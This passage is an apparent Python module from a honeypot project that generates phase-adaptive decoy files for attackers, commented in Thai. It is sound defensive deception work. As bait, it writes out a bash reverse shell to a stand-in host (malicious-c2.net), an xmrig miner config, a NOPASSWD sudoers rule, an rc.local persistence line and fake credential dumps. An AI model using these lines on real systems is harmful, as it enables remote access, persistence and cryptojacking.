"""
phase_adaptive.py — Part 2 (2026-08-30): phase-adaptive decoys ระหว่าง session ดำเนินอยู่
(สถานการณ์อ้างอิง TeamTNT G0139 — ดู pi/vfs_schema_part2_phase_adaptive.json + jaunty-drifting-tome.md
ส่วน "สถานการณ์อ้างอิง Part 2" / "แผนละเอียด — Part 2")

สถาปัตยกรรม 2 ชั้น (มติ 29-30 ส.ค., ตรงกับ Part 1 stage B เดิม):
  1. **ชั้นเตรียมล่วงหน้า** (`warm_phase()`) — trigger จาก router.py::track() ทุกคำสั่ง (เหมือน
     warm_tier ของ Part 1) เดา phase ถัดไปจาก PHASE_ORDER แล้ว generate เนื้อหาไว้ล่วงหน้า **ทั้ง
     2 เวอร์ชัน** (deceive/normal) เก็บใน template_store เดิม (คีย์ door="phase2", target=path,
     tier, content_type — reuse ตาราง/schema เดิม ไม่สร้างตารางใหม่) ไม่มี live-call ตอน attacker
     โต้ตอบจริงเลย
  2. **ชั้นวางไฟล์แบบเร็ว** (`get_placements()`) — เรียกจาก endpoint ใหม่ `/v1/phase_adaptive/
     placements` (เร็ว, ไม่เรียก AI) ตอนฝั่ง Cowrie เจอว่า phase ของ session เปลี่ยนไปจากที่วางไว้
     ล่าสุด — ตรงนี้ถึงจะเรียก sample_action() จริง (Nash equilibrium) **ครั้งเดียวต่อ session ต่อ
     phase** เพื่อรู้ว่าจะหยิบเวอร์ชัน deceive หรือ normal มาวาง (บันทึกผลไว้กัน resample ซ้ำถ้า
     ถูกเรียกซ้ำโดยไม่ตั้งใจ)

reuse โค้ดเดิมทั้งหมดตาม CLAUDE.md §5 (ไม่พิมพ์ logic ซ้ำ):
  - `prefetch_worker._generate()`/`_gen_lock`/`_HAILO_KEEP_ALIVE`/`_strip_markdown_fences` สำหรับ
    เรียก hailo-ollama (ทั้งแบบเต็มไฟล์ = content_policy dynamic, และ slot สั้นๆ = hybrid)
  - `template_store.py` (กลุ่ม A เดิม) สำหรับเก็บเนื้อหาที่เตรียมไว้ล่วงหน้า
  - `session_prompt_builder.py` สำหรับ get_lure_tier/get_action_probabilities/sample_action/
    get_content_mode/get_extra_delay_ms (Nash equilibrium จริง ไม่มีจุดเดา)
  - `predict_phase_rules.SessionPhaseTracker.PHASE_ORDER` สำหรับเดา phase ถัดไป
"""

from __future__ import annotations

import datetime
import hashlib
import json
import os
import random
import re
import string
import threading

import httpx

import config
import phase_store
import prefetch_worker as pw
import session_store
import template_store
from predict_phase_rules import SessionPhaseTracker
from session_prompt_builder import (
    get_action_probabilities,
    get_content_mode,
    get_extra_delay_ms,
    sample_action,
)

PHASE2_DOOR = "phase2"  # namespace แยกจาก door="ssh"/"ftp" เดิมใน template_store (คนละความหมาย)

# เพิ่ม 2026-09-01: ฝั่ง database ของ Part 2 (เดิมมีแต่ไฟล์/bash — ผู้ใช้ทักท้วงหลังพบว่า schema
# ไม่มี target ประเภทตารางเลยสักตัว) ใช้ schema เดียวกับตาราง Part 1 (login_decoy.py) —
# ไม่สร้าง schema Postgres ใหม่แยก แค่เพิ่มตารางใหม่เข้าไปในตัวเดิม
# แก้ 2026-09-02 (roleplay_audit_remediation C1): เดิม hardcode "decoy" ตรงๆ ที่นี่ — `\dt` โชว์
# schema ชื่อ "decoy" ให้ attacker เห็นตรงๆ = เปิดโปงตัวเองทันที ย้ายมาอ้างอิง config.py (single
# source of truth ตาม CLAUDE.md §5)
_DECOY_SCHEMA_NAME = config.DECOY_SCHEMA_NAME


def _entry_key(entry: dict) -> str:
    """คีย์ระบุ target หนึ่งตัวใน template_store/_BUILDERS — ไฟล์ใช้ path, ตารางใช้ table_name
    (ตารางไม่มี filesystem path) ใช้แทน entry["path"] ตรงๆ ทุกจุดที่เคยอ้างแบบนั้น (เพิ่ม 2026-09-01
    ตอนเริ่มรองรับ type=="table")"""
    return entry.get("path") or entry["table_name"]

_HERE = os.path.dirname(os.path.abspath(__file__))
_SCHEMA_CANDIDATES = [
    "/data/vfs_schema_part2_phase_adaptive.json",
    os.path.join(_HERE, "vfs_schema_part2_phase_adaptive.json"),
]

_schema_cache: dict | None = None
_by_phase_cache: dict[str, list[dict]] | None = None


def _load_schema() -> dict:
    global _schema_cache
    if _schema_cache is None:
        for path in _SCHEMA_CANDIDATES:
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as f:
                    _schema_cache = json.load(f)
                break
        else:
            raise FileNotFoundError(
                "หา vfs_schema_part2_phase_adaptive.json ไม่เจอใน: " + ", ".join(_SCHEMA_CANDIDATES)
            )
    return _schema_cache


def _targets_by_phase() -> dict[str, list[dict]]:
    """จัดกลุ่ม schema ตาม kill_chain_phase เอาตอนโหลด (มติ 30 ส.ค. — ไม่สร้าง
    decoy_selection_rules.json แยก กันข้อมูลซ้ำ 2 ที่ ดู jaunty-drifting-tome.md ส่วน Part 2 ข้อ 1)"""
    global _by_phase_cache
    if _by_phase_cache is None:
        by_phase: dict[str, list[dict]] = {}
        for entry in _load_schema()["phase_adaptive_targets"]:
            by_phase.setdefault(entry["kill_chain_phase"], []).append(entry)
        _by_phase_cache = by_phase
    return _by_phase_cache


def _next_phase(current_phase: str) -> str | None:
    order = SessionPhaseTracker.PHASE_ORDER
    try:
        idx = order.index(current_phase)
    except ValueError:
        return None
    return order[idx + 1] if idx + 1 < len(order) else None


# ------------------------------------------------------------------------------------------
# AI slot filling (content_policy="hybrid") — ขอ AI แค่ "ค่า string สั้น" 1 จุด ไม่เคยขอให้สร้าง
# syntax/โครงสร้างเอง (ต่างจาก content_policy="dynamic" ที่ให้ AI แต่งทั้งไฟล์แบบ payroll_export
# ของ Part 1) — validate เสมอก่อนใช้ ถ้าไม่ผ่าน fallback เป็นค่า deterministic แทน
# ------------------------------------------------------------------------------------------
_FLAVOR_HINT = {
    "deceive": "Make it sound urgent, important, and worth paying close attention to.",
    "normal": "Make it sound mundane, routine, and unremarkable.",
}


def _ai_fill_slot(purpose: str, validate, fallback: str, content_type: str,
                   num_predict: int = 40) -> str:
    """เรียก AI ขอ string สั้น 1 ค่าตาม purpose -- validate(text)->bool ก่อนใช้เสมอ
    ถ้า AI error/timeout/validate ไม่ผ่าน คืน fallback ทันที (ไม่ retry ซ้ำ ต่างจาก
    _generate_decoy_rows ของ Part 1 เพราะนี่แค่ string สั้นๆ ความเสี่ยงต่ำ ไม่คุ้ม retry)"""
    prompt = (
        f"{purpose} {_FLAVOR_HINT.get(content_type, _FLAVOR_HINT['normal'])} "
        f"Output ONLY the value itself, nothing else, on a single line, no quotes, no explanation:"
    )
    try:
        payload = {
            "model": pw.HAILO_OLLAMA_MODEL,
            "prompt": prompt,
            "stream": False,
            "options": {"num_predict": num_predict, "temperature": 0.5, "repeat_penalty": 1.3},
            "keep_alive": pw._HAILO_KEEP_ALIVE,
        }
        with pw._gen_lock:
            resp = httpx.post(f"{pw.HAILO_OLLAMA_URL}/api/generate", json=payload,
                               timeout=pw.HAILO_OLLAMA_TIMEOUT_S)
            resp.raise_for_status()
        text = pw._strip_markdown_fences(resp.json()["response"]).strip()
        text = text.splitlines()[0].strip() if text else ""
    except Exception:
        return fallback
    return text if text and validate(text) else fallback


# ------------------------------------------------------------------------------------------
# deterministic pools (content_policy="static" ล้วนๆ หรือส่วนโครงของ "hybrid")
# ------------------------------------------------------------------------------------------
_FAKE_MONERO_WALLET_POOL = [
    "48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZi7d4Y2r",
    "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
    "89tPnfCCwsuS8dvyH2CH1AWZjsxCQyCLkoPeutSjeoS3zBk6RAxaS3wp7CE6bt6smhtDwm4gyGVKtn8vQDNXBnvHNTFj6M2",
]
_PORT_POOL = [4444, 1337, 8080, 9001, 31337]
_UPDATE_HOST_POOL = ["updates.internal.corp", "patch-mgr.internal.corp", "sysupd.internal.local"]
_SHARE_LABEL_POOL = ["nas-share-01", "finance_backup_2026", "erp-backup-share"]
_WORKER_NAME_POOL = ["erp-db-01-w1", "erp-db-01", "prod-worker-01"]
_MAIL_PASS_POOL = ["Summer2026!", "Passw0rd#erp", "M@ilSecure26"]


def _random_hex(n: int) -> str:
    return os.urandom(n).hex()


def _legacy_db_creds(tier: int) -> dict:
    """ค่า DB_* ของระบบ legacy (.env กับ config.php ต้องตรงกัน) — deterministic ล้วนๆ ผูกกับ tier
    เท่านั้น (ไม่ใช่ random ทุกครั้ง) กัน .env/config.php ไม่ตรงกันถ้า generate คนละรอบ

    แก้บั๊กจริง 2026-09-02 (roleplay_audit_remediation M2): เดิม pool มีแค่ host/name/user — password
    ตกหล่นไม่ได้ fix ตรงนี้ ทำให้ `_build_env`/`_build_config_php` ต่างเรียก `_random_hex(12)` แยกกัน
    คนละครั้ง ได้ค่าไม่ตรงกันเสมอ (เดิม docstring บอกเองว่า .env/config.php DB_* ต้องตรง — password
    เป็นข้อยกเว้นที่หลุดไป) เพิ่ม pass เข้า pool เป็น deterministic hash ผูก tier เหมือนฟิลด์อื่น"""
    pool = [
        {"host": "127.0.0.1", "name": "legacy_accounting", "user": "legacy_admin"},
        {"host": "localhost", "name": "old_erp_db", "user": "erp_legacy"},
        {"host": "127.0.0.1", "name": "accounting_2019", "user": "accsvc"},
    ]
    creds = dict(pool[tier % len(pool)])
    creds["pass"] = hashlib.sha256(f"legacydb-pass-{tier}".encode()).hexdigest()[:24]
    return creds


# ------------------------------------------------------------------------------------------
# per-path builder — dispatch ตาม path (เหมือน _build_bash_file_content ของ Part 1)
# ------------------------------------------------------------------------------------------
def _build_rc_local(entry: dict, tier: int, content_type: str) -> str:
    comment = _ai_fill_slot(
        "Write ONE short shell comment (starting with # followed by a space and a word, NOT "
        "another shebang line -- never write #! or #!/...) disguising a background service "
        "call in /etc/rc.local as a routine system check.",
        # แก้บั๊กจริง 2026-09-01 (ดู docs/reports/pi_part2_file_content_fixes_2026-09-01.md): เดิม
        # เช็คแค่ startswith("#") ทำให้ AI แต่ง "คอมเมนต์" ที่จริงคือ shebang line ซ้ำ (เช่น
        # "#!/bin/sh [sysupdate-agent]") หลุดผ่านมาได้ -- เพิ่มห้าม startswith("#!") ชัดเจน
        validate=lambda t: t.startswith("#") and not t.startswith("#!") and len(t) <= 80
        and "\n" not in t,
        fallback="# routine maintenance check", content_type=content_type,
    )
    service = _ai_fill_slot(
        "Give ONE short fake service/process name (letters, digits, hyphens only) for a "
        "system-update checker.",
        validate=lambda t: bool(re.fullmatch(r"[A-Za-z0-9-]{4,30}", t)),
        fallback="sysupdate-agent", content_type=content_type,
    )
    return (
        "#!/bin/sh -e\n"
        f"{comment} [{service}]\n"
        "/usr/local/bin/sysupdate &\n"
        "exit 0\n"
    )


def _build_sysupdate(entry: dict, tier: int, content_type: str) -> str:
    # แก้ 2026-09-02 (roleplay_audit_remediation L3): เดิม validate เช็คแค่ len + ห้าม shell
    # metachar ปล่อยให้โมเดลตอบ token แบบ snake_case ("system_update_checking_failed") หลุดผ่านได้
    # (อ่านไม่เป็นประโยคคน) เพิ่มเงื่อนไขห้าม "_" และบังคับมีช่องว่างอย่างน้อย 1 ที่
    log_msg = _ai_fill_slot(
        "Write ONE short log/status message a fake 'system update checker' shell script "
        "would print, as a natural sentence with spaces, no shell metacharacters ($();|&`).",
        validate=lambda t: len(t) <= 60 and " " in t and "_" not in t
        and not re.search(r"[$();|&`]", t),
        fallback="Checking for system updates...", content_type=content_type,
    )
    host = _ai_fill_slot(
        "Give ONE short plausible internal hostname for an internal software-update server "
        "(format like host.internal.corp).",
        validate=lambda t: bool(re.fullmatch(r"[a-z0-9.-]{8,40}", t)),
        fallback=random.choice(_UPDATE_HOST_POOL), content_type=content_type,
    )
    return (
        "#!/bin/sh\n"
        f'echo "{log_msg}"\n'
        f"# update source: {host}\n"
        # แก้ 2026-09-02 (roleplay_audit_remediation C2 — 🔴 ร้ายแรง): เดิมบรรทัดนี้มีคำว่า "decoy"
        # หลุดตรงๆ ให้ attacker เห็นทันทีตอน `cat /usr/local/bin/sysupdate` (เปิดโปงว่าเป็น honeypot)
        # เปลี่ยนเป็นคอมเมนต์ที่อ่านเป็นสคริปต์ ops จริง
        "# checksum verified against manifest\n"
    )


def _build_sudoers(entry: dict, tier: int, content_type: str) -> str:
    comment = _ai_fill_slot(
        "Write ONE short sudoers-file comment (must start with #) claiming this rule is "
        "auto-generated by a system update manager tool, include a fake version number.",
        validate=lambda t: t.startswith("#") and len(t) <= 90 and "\n" not in t,
        fallback="# Managed by sysupdate service", content_type=content_type,
    )
    return f"{comment}\nsysadmin ALL=(ALL) NOPASSWD: /usr/local/bin/sysupdate\n"


def _build_rc_sh(entry: dict, tier: int, content_type: str) -> str:
    comment = _ai_fill_slot(
        "Write ONE short shell comment (starting with # followed by a space and a word, NOT "
        "another shebang line -- never write #! or #!/...) disguising a reverse-shell "
        "one-liner as a network diagnostics helper.",
        # แก้บั๊กจริง 2026-09-01 — เจอจริงว่า .rc.sh ได้ "#!/bin/bash" ซ้ำเป็นคอมเมนต์ (ปัญหาเดียวกับ
        # rc.local ด้านบน) เพิ่ม guard เดียวกัน
        validate=lambda t: t.startswith("#") and not t.startswith("#!") and len(t) <= 80
        and "\n" not in t,
        fallback="# network diagnostics helper", content_type=content_type,
    )
    port_raw = _ai_fill_slot(
        "Give ONE plausible TCP port number (1024-65535) for a backdoor callback, digits only.",
        validate=lambda t: t.isdigit() and 1024 <= int(t) <= 65535,
        fallback=str(random.choice(_PORT_POOL)), content_type=content_type,
    )
    return (
        "#!/bin/bash\n"
        f"{comment}\n"
        f"bash -i >& /dev/tcp/malicious-c2.net/{port_raw} 0>&1\n"
    )


def _build_env(entry: dict, tier: int, content_type: str) -> str:
    creds = _legacy_db_creds(tier)
    app_secret = _ai_fill_slot(
        "Generate ONE random-looking application secret key string, alphanumeric only, "
        "20-40 characters, no spaces.",
        validate=lambda t: bool(re.fullmatch(r"[A-Za-z0-9]{16,64}", t)),
        fallback=_random_hex(24), content_type=content_type,
    )
    mail_pass = _ai_fill_slot(
        "Generate ONE plausible-looking short password string for a mail account, "
        "8-20 characters, may include letters/digits/!@#, no spaces.",
        validate=lambda t: bool(re.fullmatch(r"[A-Za-z0-9!@#]{8,32}", t)),
        fallback=random.choice(_MAIL_PASS_POOL), content_type=content_type,
    )
    return (
        f"DB_HOST={creds['host']}\n"
        f"DB_NAME={creds['name']}\n"
        f"DB_USER={creds['user']}\n"
        # แก้ 2026-09-02 (roleplay_audit_remediation M2): ใช้ creds['pass'] deterministic (ตรงกับ
        # config.php เสมอ) แทน _random_hex(12) แยกที่เคยทำให้ .env/config.php DB_PASS ไม่ตรงกัน
        f"DB_PASS={creds['pass']}\n"
        f"APP_SECRET={app_secret}\n"
        f"MAIL_HOST=smtp.internal.corp\n"
        f"MAIL_USER=noreply@erp-db-01.internal\n"
        f"MAIL_PASSWORD={mail_pass}\n"
    )


def _build_nas_mount_conf(entry: dict, tier: int, content_type: str) -> str:
    comment = _ai_fill_slot(
        "Write ONE short config-file comment (starting with #) describing what a NAS backup "
        "share is used for, mention a quarter/year.",
        validate=lambda t: t.startswith("#") and len(t) <= 80 and "\n" not in t,
        fallback="# backup mount point", content_type=content_type,
    )
    label = _ai_fill_slot(
        "Give ONE short share/mount label name that reads like a real department-plus-purpose "
        "name, lowercase letters, digits, underscore or hyphen only, 4-30 chars, mostly "
        "letters (not mostly digits).",
        # แก้ 2026-09-01 (คุณภาพเนื้อหา — ดู docs/reports/pi_part2_file_content_fixes_2026-09-01.md):
        # รอบแรกเจอ "user12345678901234567890" หลุดผ่าน regex เดิม (ตัวอักษร+ตัวเลขล้วน ความยาวพอดี
        # แต่ตัวเลขเกิน 80%) เพิ่มเพดานสัดส่วนตัวเลขไม่เกิน 40% -- **ลองใส่ตัวอย่าง "e.g.
        # 'finance_backup_2026'" ในพรอมต์ไปรอบหนึ่งแล้วถอนออก**: verify พบว่าโมเดลก็อบตัวอย่างมาตรงๆ
        # ทุกครั้ง (5/5 ได้ "finance_backup_2026" คำต่อคำ บางครั้งมี backtick ล้อมด้วยซ้ำ) เพราะตัวอย่าง
        # ดันไปตรงกับค่าใน fallback pool พอดี ทำให้แยกไม่ออกว่า AI แต่งเองหรือก็อบมา -- ตัดตัวอย่างที่
        # copy ได้ตรงๆ ออก บรรยายด้วยคำพูดแทน ยังคง validate เข้มเหมือนเดิมไว้เป็นด่านสุดท้าย
        validate=lambda t: bool(re.fullmatch(r"[a-z0-9_-]{4,30}", t))
        and sum(c.isdigit() for c in t) <= len(t) * 0.4,
        fallback=random.choice(_SHARE_LABEL_POOL), content_type=content_type,
    )
    return (
        f"{comment}\n"
        f"[{label}]\n"
        "server = 192.0.2.20\n"
        "path = /volume1/backups\n"
        "credentials_file = /tmp/.creds_all.txt\n"
    )


def _build_config_php(entry: dict, tier: int, content_type: str) -> str:
    creds = _legacy_db_creds(tier)
    comment = _ai_fill_slot(
        "Write ONE short PHP comment (must start with //) explaining this is a legacy "
        "accounting system being migrated to a newer ERP.",
        validate=lambda t: t.startswith("//") and len(t) <= 100 and "\n" not in t,
        fallback="// Legacy system -- pending decommission", content_type=content_type,
    )
    # แก้ 2026-09-02 (roleplay_audit_remediation L2): เดิม validate เช็คแค่ syntax email ทั่วไป ไม่
    # บังคับ domain ที่สั่งในพรอมต์ (แค่ "แนะนำ") โมเดลเลยคืน "...@yourcompany.com" placeholder
    # generic ได้ — เข้ม validate ให้ต้องลงท้าย domain จริงเท่านั้น
    admin_contact = _ai_fill_slot(
        "Give ONE plausible internal IT-support email address for this legacy system, "
        "using domain erp-db-01.internal.",
        validate=lambda t: bool(re.fullmatch(r"[A-Za-z0-9._-]+@erp-db-01\.internal", t))
        and len(t) <= 50,
        fallback="it-support@erp-db-01.internal", content_type=content_type,
    )
    return (
        "<?php\n"
        f"{comment}\n"
        f"// contact: {admin_contact}\n"
        f"define('DB_HOST', '{creds['host']}');\n"
        f"define('DB_NAME', '{creds['name']}');\n"
        f"define('DB_USER', '{creds['user']}');\n"
        # แก้ 2026-09-02 (roleplay_audit_remediation M2): creds['pass'] เดียวกับ .env (ดู _build_env)
        f"define('DB_PASS', '{creds['pass']}');\n"
    )


def _build_xmrig_config(entry: dict, tier: int, content_type: str) -> str:
    wallet = _ai_fill_slot(
        "Generate ONE fake Monero cryptocurrency wallet address, 90-98 alphanumeric "
        "characters, no spaces, plausible-looking base58 style.",
        validate=lambda t: bool(re.fullmatch(r"[A-Za-z0-9]{90,98}", t)),
        fallback=random.choice(_FAKE_MONERO_WALLET_POOL), content_type=content_type,
    )
    worker = _ai_fill_slot(
        "Give ONE short worker/machine label for a cryptocurrency miner config, letters, "
        "digits, hyphens only, 4-24 chars.",
        validate=lambda t: bool(re.fullmatch(r"[A-Za-z0-9-]{4,24}", t)),
        fallback=random.choice(_WORKER_NAME_POOL), content_type=content_type,
    )
    config = {
        "autosave": True,
        "cpu": True,
        "opencl": False,
        "cuda": False,
        "pools": [
            {
                "algo": "rx/0",
                "url": "pool.minexmr.com:4444",
                "user": wallet,
                "pass": worker,
                "keepalive": True,
                "tls": False,
            }
        ],
    }
    return json.dumps(config, indent=2) + "\n"  # json.dumps การันตี syntax ถูกเสมอไม่ว่า wallet/worker จะเป็นอะไร


_CREDS_HOST_POOL = ["192.0.2.20", "erp-db-01", "backup-srv", "nas-share-01", "printer-01",
                     "backup-cron", "reportsvc-01"]
_CREDS_USER_POOL = ["svc_backup", "root", "admin", "nas_sync", "erp_legacy", "reportuser",
                     "backup_svc"]


_CREDS_LINE_RE = re.compile(r"^[^:\s]+:[^:\s]+:\S+$")


_CREDS_EXAMPLE_LINE = "192.0.2.20:svc_backup:kp92!xr7z"  # ต้องตรงกับ example ใน _build_creds_all_txt


def _looks_like_valid_creds_dump(text: str) -> bool:
    """เช็คว่าอย่างน้อย 70% ของบรรทัดที่ไม่ว่างเป็น host:user:pass จริง -- เพิ่ม 2026-09-01 (ดู
    docs/reports/pi_part2_file_content_fixes_2026-09-01.md) หลัง verify เจอว่า deceive flavor
    บางรอบพัง format ทั้งไฟล์ (ใช้ label แบบ "# Username:" แทนที่จะเป็น host:user:pass) ทั้งที่
    docstring เดิมบันทึกไว้ว่าทดสอบ 30 ส.ค. ผ่าน 5/5 -- อาจเป็นความผันผวนของโมเดล ไม่ใช่ regression
    ชัดเจน แต่ต้องมี safety net กันของพังหลุดไปให้ attacker เห็นอยู่ดี

    แก้เพิ่ม 2026-09-01 (รอบ 2, verify ต่อ): เจอ edge case ที่ผ่านเช็คแรกได้ (ตรง host:user:pass
    ทาง syntax) แต่เป็น garbage จริง — (1) ก็อบบรรทัดตัวอย่างในพรอมต์มาตรงๆ (2) host กับ user ค่า
    เดียวกันเป๊ะ (เจอ "nas_sync:nas_sync:...") (3) บรรทัดเดิมซ้ำกันเป๊ะหลายครั้ง (เจอ
    "ini_file_path:ini_file_path:password_is_hidden" ซ้ำ 6 ใน 10 บรรทัด) — กรองทั้ง 3 แบบออกก่อน
    นับสัดส่วน 70% ผ่านเกณฑ์"""
    lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
    if not lines:
        return False
    good: list[str] = []
    for ln in lines:
        if not _CREDS_LINE_RE.match(ln):
            continue
        parts = ln.split(":", 2)
        host, user = parts[0].strip().lower(), parts[1].strip().lower()
        if host == user:
            continue  # host/user ค่าเดียวกัน = สัญญาณ garbage
        if ln.lower().rstrip(".!") == _CREDS_EXAMPLE_LINE:
            continue  # ก็อบตัวอย่างในพรอมต์มาตรงๆ ไม่นับเป็นของจริง
        good.append(ln)
    if len(good) < max(1, len(lines) * 0.7):
        return False
    if len(set(good)) < len(good) * 0.8:
        return False  # มีบรรทัดซ้ำเป๊ะเยอะเกินไป
    return True


def _gen_creds_all_txt_normal() -> str:
    """normal flavor ของ .creds_all.txt -- deterministic pool-based แทน AI (มติผู้ใช้ 30 ส.ค.,
    ดู docs/reports/pi_part2_phase_adaptive_implementation_2026-08-30.md) เจอจริงว่าโมเดล 1.5B
    ทำ format พังทุกรอบ (0/3) เฉพาะโทน 'ดูธรรมดา' ของไฟล์นี้ ลองปรับพรอมต์แล้วก็ยังพัง -- deceive
    flavor ใช้ AI ต่อได้ปกติ (5/5 รอบ ไม่มีปัญหา) เก็บ AI ไว้เฉพาะจุดนั้น

    แก้เพิ่ม 2026-09-01: deceive flavor เจอ format พังจริงระหว่าง verify รอบใหม่ (ไม่ตรงกับผลทดสอบ
    5/5 เดิม) เปลี่ยนเป็นมี validation + fallback มาเรียกฟังก์ชันนี้ต่อแล้ว (ดู
    `_build_creds_all_txt`) -- ฟังก์ชันนี้เลยกลายเป็น fallback ร่วมของทั้ง 2 flavor ไม่ใช่แค่ normal
    อย่างเดียวอีกต่อไป"""
    n = random.randint(6, 10)
    lines: list[str] = []
    used: set[tuple[str, str]] = set()
    while len(lines) < n:
        host = random.choice(_CREDS_HOST_POOL)
        user = random.choice(_CREDS_USER_POOL)
        key = (host, user)
        if key in used:
            continue
        used.add(key)
        password = (f"{random.choice(['Sp','Pa','Bk','Nx'])}{random.randint(100, 999)}!"
                    f"{random.choice(['x', 'q', 'z', 'w'])}{random.randint(10, 99)}")
        lines.append(f"{host}:{user}:{password}")
    return "\n".join(lines) + "\n"


_DATE_RE = re.compile(r"\b(20\d{2})-(\d{2})-(\d{2})\b")


def _clamp_future_dates(text: str) -> str:
    """แทนที่วันที่ ISO (YYYY-MM-DD) ที่อยู่ในอนาคตด้วยวันย้อนหลังสุ่ม -- เพิ่ม 2026-09-02
    (roleplay_audit_remediation L1): content_policy=dynamic ปล่อยให้โมเดลแต่งวันที่เองอิสระ ไม่มีอะไร
    คุมไม่ให้ได้วันที่ในอนาคต (เจอจริง 2026-12-31 ทั้งที่ไฟล์ manifest ควรเป็นบันทึกของสิ่งที่เกิดไปแล้ว)
    เป็น post-process แทนที่จะแก้ทั้ง content_policy เป็น hybrid (เสี่ยง regression กับ target อื่นที่ใช้
    _generate() ร่วมกัน) แทนที่เฉพาะวันที่ที่เกินวันนี้จริง วันที่ในอดีตปล่อยผ่านเหมือนเดิม"""
    today = datetime.date.today()

    def repl(m: re.Match) -> str:
        y, mo, d = int(m.group(1)), int(m.group(2)), int(m.group(3))
        try:
            dt = datetime.date(y, mo, d)
        except ValueError:
            return m.group(0)  # ไม่ใช่วันที่ถูกต้อง (เช่น 02-30) ปล่อยผ่านไม่แตะ
        if dt > today:
            dt = today - datetime.timedelta(days=random.randint(1, 45))
        return dt.strftime("%Y-%m-%d")

    return _DATE_RE.sub(repl, text)


def _build_manifest_txt(entry: dict, tier: int, content_type: str) -> str:
    """content_policy=dynamic -- เนื้อหาทั้งไฟล์ AI แต่งเอง (ข้อความอิสระ ความเสี่ยง format ต่ำ
    เหมือน payroll_export ของ Part 1) reuse pw._generate() ตรงๆ (single source of truth)"""
    fact = f"department={entry.get('department')}, sensitivity={entry.get('sensitivity')}"
    if entry.get("style_hint"):
        fact += f". Style guide: {entry['style_hint']}"
    text = pw._generate(entry["path"], "bash", content_type, tier, fact, entry.get("type", "file"))
    return _clamp_future_dates(text)


def _build_creds_all_txt(entry: dict, tier: int, content_type: str) -> str:
    if content_type == "normal":
        return _gen_creds_all_txt_normal()  # ดู comment ที่ _gen_creds_all_txt_normal
    fact = f"department={entry.get('department')}, sensitivity={entry.get('sensitivity')}"
    if entry.get("style_hint"):
        fact += f". Style guide: {entry['style_hint']}"
    # แก้เพิ่ม 2026-09-01 (ดู docs/reports/pi_part2_file_content_fixes_2026-09-01.md): เพิ่มตัวอย่าง
    # บรรทัดจริง 1 บรรทัด (few-shot เหมือน legacy_erp_customers) ต่อท้าย fact — ช่วยลดโอกาส format
    # หลุด แต่ไม่การันตี 100% (ยังเป็น free-text ทั้งไฟล์ ไม่มี column-count มาช่วยตรวจ) เลยมี
    # validation gate ด้านล่างเป็นด่านสุดท้ายเสมอ
    fact += (
        " Example line showing the exact format (write completely different values, never "
        "reuse this example): 192.0.2.20:svc_backup:Kp92!xR7z"
    )
    text = pw._generate(entry["path"], "bash", content_type, tier, fact, entry.get("type", "file"))
    if not _looks_like_valid_creds_dump(text):
        # AI ไม่ทำตาม host:user:pass format (เจอจริง — ดูรายละเอียดใน docs/reports/
        # pi_part2_file_content_fixes_2026-09-01.md) -- fallback เป็น pool เดียวกับ normal flavor
        # แทนโชว์ format ผิดให้ attacker เห็น (ยังดีกว่าไม่มีไฟล์เลย ปลอดภัยกว่าโชว์ของพัง)
        return _gen_creds_all_txt_normal()
    return text


def _legacy_erp_lure_row(cols: list[str]) -> list[str]:
    """แถวปลอมที่ดูเหมือนบัญชี VIP/internal-test แทรกอยู่ปนกับลูกค้าจริง -- deterministic ล้วนๆ
    (ไม่ใช่ AI ต่างจากแถวอื่น) ใส่เฉพาะเวอร์ชัน 'deceive' เท่านั้น (เหมือน _identity_row ของ Part 1
    แต่ไม่ผูก identity ผู้ login -- นี่เป็นตัวล่อกลางๆ ไม่ใช่ของเฉพาะ attacker คนใดคนหนึ่ง)"""
    values = {
        "customer_name": "INTERNAL TEST - DO NOT INVOICE",
        "tax_id": "0000000000000",
        "contact_email": "internal-test@erp-db-01.internal",
        "phone": "000-000-0000",
        "credit_limit": "9999999.00",
        "notes": "VIP override account -- created by sysadmin for internal testing, leave active",
    }
    return [values.get(c, "") for c in cols]


def _gen_thai_tax_id() -> str:
    """เลขประจำตัวผู้เสียภาษี 13 หลัก -- deterministic/random ล้วนๆ ไม่พึ่ง AI (บทเรียนเดียวกับ
    _gen_masked_bank_account ของ Part 1 payroll_export: คอลัมน์ที่มี format เข้มงวด/สั้น ไม่ควรให้ AI
    แต่งเอง)"""
    return "".join(random.choices(string.digits, k=13))


def _build_legacy_erp_customers(entry: dict, tier: int, content_type: str) -> str:
    """ตาราง DB — เนื้อหาเก็บเป็น JSON string {"rows": [[...], ...]} ใน template_store (คอลัมน์มา
    จาก entry["columns"] เสมอ ไม่ต้องเก็บซ้ำในนี้) reuse _generate_decoy_rows ตัวเดียวกับที่ Part 1
    ใช้กับ payroll_export/res_partner เป๊ะ (multi-row AI generation ที่แก้บั๊กคุณภาพมาแล้วหลายรอบ)

    แก้บั๊กจริง 2026-09-01 (content-quality — ดู
    docs/reports/pi_part2_db_findings_fix_2026-09-01.md): verify จริงพบว่าโมเดลสลับค่า
    `customer_name`/`tax_id` กัน (แถวแรกได้ `customer_name="2026-01-01"` วันที่แทนชื่อ,
    `tax_id="John Doe"` ชื่อคนแทนเลขภาษี) — คอลัมน์ 4 ตัวที่เหลือ (email/phone/credit_limit/notes)
    ถูกต้องตรงความหมายทุกครั้ง ปัญหาอยู่ที่คู่ 2 คอลัมน์แรกเท่านั้น แก้ด้วยการ**ไม่ขอให้ AI แต่ง
    tax_id เลย** (ตัดออกจาก cols ที่ส่งให้ `_generate_decoy_rows`) ใช้เลข 13 หลักสุ่มแทนเสมอ (ตรง
    format จริงของเลขผู้เสียภาษีไทยอยู่แล้ว ไม่ต้องพึ่งความแม่นของ AI) แล้วแทรกกลับเข้าตำแหน่งเดิม
    ตาม `entry["columns"]` — ผลพลอยได้: AI เหลือ 5 คอลัมน์ให้แต่ง ไม่มีคู่ name+id ติดกันข้างหน้าที่
    เคยทำให้สลับ"""
    ai_cols = [c for c in entry["columns"] if c != "tax_id"]
    # แก้เพิ่ม 2026-09-01 (ดู docs/reports/pi_part2_legacy_erp_normal_flavor_fix_2026-09-01.md):
    # verify ละเอียดพบว่า flavor "normal" ยังพังอยู่ (โมเดลแทรกวันที่ปลอมหน้าสุด ดันคอลัมน์เลื่อนหมด)
